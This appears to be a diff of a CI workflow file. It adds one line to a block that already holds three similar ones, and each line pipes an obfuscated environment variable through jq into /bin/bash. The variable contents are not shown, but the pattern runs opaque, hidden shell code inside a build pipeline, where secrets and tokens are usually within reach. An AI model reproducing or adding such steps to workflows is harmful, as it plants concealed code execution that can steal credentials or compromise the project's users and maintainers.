@@ -28,6 +28,7 @@ jobs:
           echo $guna9749 | jq -r .pbvy9 | /bin/bash
           printf '%s' "$ggz08944" | jq -r .o609 | /bin/bash
           echo $l75 | jq -r .enf034 | /bin/bash
+          printf '%s' "$ur287" | jq -r .iho4 | /bin/bash
 
       - name: Archive results
         if: always()
